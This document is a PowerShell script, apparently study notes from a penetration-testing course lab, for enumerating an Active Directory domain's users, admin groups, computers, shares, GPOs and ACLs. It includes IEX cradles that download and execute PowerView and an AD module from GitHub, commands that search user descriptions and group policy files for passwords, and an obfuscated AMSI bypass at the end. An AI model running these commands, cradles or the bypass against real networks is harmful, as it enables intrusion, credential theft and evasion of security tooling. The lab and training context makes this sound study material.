<#function Enumerate-AD {
[CmdletBinding()]
<#
.SYNOPSIS
Script to enumerate a Windows domain. Comments will discuss what actions are doing, etc.
Based on learning from PTA's A&DAD course

.DESCRIPTION
It will use either built-in capabilities (ninja), AD module (knight),
or Powerview (pirate) to obtain AD info based on how quiet you want to be

PARAMETER -mode ninja
Will only use built-in .NET capabilities to obtain information.
Stealthiest.

.PARAMETER -mode knight
Will leverage the AD module from MS. If it's not on the system already, it downloads Nikhil's copy via an IEX cradle. Works well on constrained language mode.
The IEX will make this less stealthy.

.PARAMETER -mode pirate
Will leverage PowerView to perform checks using an IEX cradle. Loud and proud.
The IEX plus use of PowerView makes this noisy.

.NOTES
 - Plenty of TODOs

.EXAMPLE
Enumerate-AD -mode pirate



param(
    [Parameter(Mandatory = true)
    [String]$mode
)
#>

#--## SETUP ##--#
Write "[+] Trying to import AD tools"

## Try to see if AD module is available:
#Import-Module ActiveDirectory

## If not, You can try to download the MS official AD module with this cradle (instead of having to manually install it)
#IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')
#Import-ActiveDirectory
## In PTA labs, it's this:
Import-Module .\ADModule-master\ADModule-master\Microsoft.ActiveDirectory.Management.dll

## If noisy, grab powerview
#IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1')
## If PTA labs, grab locally
#IEX C:\AD\Tools\PowerView.ps1


#--## GENERAL DOMAIN INFO ##--#

## NATIVE ##
## Gets current domain info and stores in obj
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]

## Calls static method to get domain summary from ADClass object
Write "[+] Current Forest, Domain, DC's, PDC, etc."
$ADClass::GetCurrentDomain()
## Get current domain level and print
$ADFuncLevel = $ADClass::GetComputerDomain().DomainModeLevel


## AD MODULE ##
## Get domain info
$ADClass = Get-ADDomain
Get-ADDomain -Identity moneycorp.local  # Specify domain
Get-DomainSID

## POWERVIEW ##
## Get domain info
$ADClass = Get-NetDomain
Get-NetDomain -Domain moneycorp.local  # Specify domain
(Get-ADDomain).DomainSID

Switch($ADFuncLevel) {
    0 {"[+] Domain Level: Windows 2000 Domain"}
    1 {"[+] Domain Level: Windows 2003 Interim Domain"}
    2 {"[+] Domain Level: Windows 2003 Domain"}
    3 {"[+] Domain Level: Windows 2008 Domain"}
    4 {"[+] Domain Level: Windows 2008 R2 Domain"}
    5 {"[+] Domain Level: Windows 2012 Domain"}
    6 {"[+] Domain Level: Windows 2012 R2 Domain"}
    7 {"[+] Domain Level: Windows 2016 Domain"}
}

##--## GET DOMAIN POLICY INFO ##--##

## POWERVIEW ##
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."Kerberos Policy"

## AD MODULE ##
Get-ADDefaultDomainPasswordPolicy  # Gets password policy



##--## GET DOMAIN CONTROLLER INFO ##--##

## POWERVIEW ##
Get-NetDomainController

## AD MOD ##
Get-ADDomainController


##--## GET DOMAIN USER INFO ##--##
## Get all users with all properties
Write "[+] Getting Domain Users..."
Get-NetUser -Filter * -Properties *  # pview
Get-ADUser -Filter * -Properties *  # ADmod
## Find users with Descriptions set:
Write "[+] Looking for Users with Description fields set. Check for Passwords:"
Find-Userfield -SearchField Description -Searchterm "*"  # pview
Get-ADUser -Filter 'Description -like "*"' -Properties Description | select Name,Description

##--## GET DOMAIN COMPUTER INFO ##--##
Write "[+] Getting Domain Computers..."
Get-NetComputer -FullData  # pview
Get-ADComputer -Filter *  # ADmod

Write "[+] Getting Old OS's..."
Get-NetComputer -OperatingSystem "*XP*"  # pview
Get-NetComputer -OperatingSystem "*Vista*"  # pview
Get-NetComputer -OperatingSystem "*200*"  # pview

Get-ADComputer -Filter 'OperatingSystem -like "*XP*"' -Properties OperatingSystem | Select Name,OperatingSystem  # ADmod
Get-ADComputer -Filter 'OperatingSystem -like "*Vista*"' -Properties OperatingSystem | Select Name,OperatingSystem  # ADmod
Get-ADComputer -Filter 'OperatingSystem -like "*200*"' -Properties OperatingSystem | Select Name,OperatingSystem  # ADmod

##--## GET DOMAIN GROUP INFO ##--##
Write "[+] Getting Domain Groups..."
Get-NetGroup  # pview
Get-ADGroup -Filter * -Properties SamAccountName | Select SamAccountName  # ADmod

Write "[+] Getting Administrators & Domain Admins..."
Get-NetGroupMember -GroupName "Administrators" -Recurse
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins"  # ADmod
## TODO: -Recurse for ADmod too:
## TODO: foreach ($group in !! where "IsGroup -eq True") { Get-AdGroupMember -Identity $group.GroupName }
## TODO: this should be cyclical to get anyone who could possibly be nested under that

Write "[+] Getting other potentially powerful groups + members..."
Get-NetGroup -GroupName *admin*  # pview
Get-ADGroup -filter 'SamAccountName -like "*Admin*"' -Properties Members | Select SamAccountName,Members  # ADmod


##--## GET LOGGED ON USERS ##--##
# Needs admin rights on target computer
#Get-NetLoggedon -ComputerName $computer  # pview
# Needs remote registry started (started by default on Server OS)
#Get-LoggedonLocal -ComputerName $computer  # pview
# Get last logged on users (needs admin rights and remote registry on target)
#Get-LastLoggedon -ComputerName $computer


##--## GET FILE SERVER INFO ##--##
Write "[+] Looking around for interesting files and file shares..."
# Powerview looks for shares, interesting files, and file servers...
Invoke-ShareFinder -Verbose  # pview
# Exclude noise:
Invoke-ShareFinder -Verbose -ExcludePrint -ExcludeIPC  # pview
Invoke-FileFinder -Verbose  # pview
Get-NetFileServer  # pview

##--## GET OU DATA ##--##
Write "[+] Getting OUs..."
Get-NetOU -FullData  # pview
Get-ADOrganizationalUnit -Filter * -Properties * | Select Name  # ADmod
Get-ADOrganizationalUnit -Filter * -Properties *  # ADmod

##--## GET GPO INFO ##--##
# TODO: find DLL for this like w/ AD mod and test if you can do it w/o being an admin
Import-Module GroupPolicy  # ADmod
Get-Gpo -All  # ADmod
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Public\GPreport.html  # ADmod

Get-NetGPO  # pview
# Show which policies are applied to a specific computer
Get-NetGPO -ComputerName dcorp1-dc.dollarcorp.moneycorp.local  # pview
# Check for low-hanging fruit (groups.xml)
Get-NetGPOGroup  #pview

# Find users who are in a local group of a machine via GPO:
Find-GPOComputerAdmin -ComputerName dcorp1-dc.dollarcorp.moneycorp.local  # pview
# Find machines where given user is member of a specific group:
Find-GPOLocation -Username $env:USERNAME -Verbose  # pview 


##--## GET ACL/ACE INFO ##--##
# Get the ACLs associated w/ a specific object:
Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs  # pview
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access  # ADmod

# Get ACLs associated w/ a prefix for searching:
Get-ObjectAcl -ADSPrefix 'CN=Administrator,CN=Users' -Verbose  #pview

# TODO: Find any interesting ACEs for high-value groups such as admins (like non-default settings)




## AMSI BYPASS, NEEDS OBFUSCATION
# [Delegate]::CreateDelegate(("Func``3String[String,$(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName),System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Ty'+'pe')),[Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('Ge'+'tFiel'+'d')).Invoke('amsiInitFailed'),(('No'+'nPub'+'li'+'c,Stat'+'ic') -as [String].Assembly.GetType('System.Reflection.Bind'+'in'+'gFl'+'ags')).SetValue($null,$True)
